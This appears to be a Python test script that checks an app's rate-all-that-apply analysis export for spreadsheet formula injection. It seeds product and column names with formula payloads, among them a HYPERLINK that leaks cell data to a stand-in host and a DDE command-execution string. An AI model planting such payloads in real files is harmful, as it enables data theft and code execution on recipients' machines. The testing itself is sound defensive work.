"""Drive the real RATA workflow with formula-like product/attribute names and inspect the export."""
import sys, io
sys.path.insert(0, '.')
import pandas as pd, openpyxl
from pathlib import Path
import pytest
from tests.test_apptest_smoke import _open_module

P = Path('example_data/02_Descriptive/DA_chocolates_sensochoc.xlsx')
raw = pd.read_excel(P)
EVIL_P = {'choc1': '=1+1', 'choc2': '@SUM(2,2)', 'choc3': '+3+3', 'choc4': '-4+4',
          'choc5': '=HYPERLINK("http://example.invalid/?leak="&A2,"Click")'}
raw['Product'] = raw['Product'].replace(EVIL_P)
raw = raw.rename(columns={'CocoaA': '=2*21', 'MilkA': '=cmd|\' /C calc\'!A0'})

import core.data as core_data, utils.ui_shell as ui_shell
class _U: name = 'evil.xlsx'
ui_shell.render_data_upload_section = lambda *a, **k: _U()
core_data.load_data = lambda _f: raw.copy()

at = _open_module("Rate-All-That-Apply")
at.selectbox(key="rata_assessor").set_value("Panelist").run()
at.selectbox(key="rata_product").set_value("Product").run()
at.selectbox(key="rata_replicate").set_value("Session").run()
at.number_input(key="rata_scale_max").set_value(10).run()
at.button(key="rata_run_analysis").click().run(timeout=600)
print('exception:', at.exception)
ss = at.session_state.to_dict()
from utils.export import generate_excel_report
buf = generate_excel_report(ss["rata_df_long"], ss["rata_summary_df"], ss["rata_cld_df"], ss["rata_anova_df"],
    ss["rata_cochrans_df"], ss["rata_post_hoc_method"], ss["rata_col_map"], ss["rata_alpha"], state=ss)
open(Path(sys.argv[1]) / 'rata_evil_export.xlsx', 'wb').write(buf.getvalue())
wb = openpyxl.load_workbook(io.BytesIO(buf.getvalue()))
from collections import Counter
c = Counter(); examples = {}
for ws in wb.worksheets:
    for row in ws.iter_rows():
        for cell in row:
            if cell.data_type == 'f':
                c[ws.title] += 1
                examples.setdefault(ws.title, []).append((cell.coordinate, cell.value))
print('formula cells per sheet:', dict(c))
for k, v in examples.items(): print(k, v[:4])
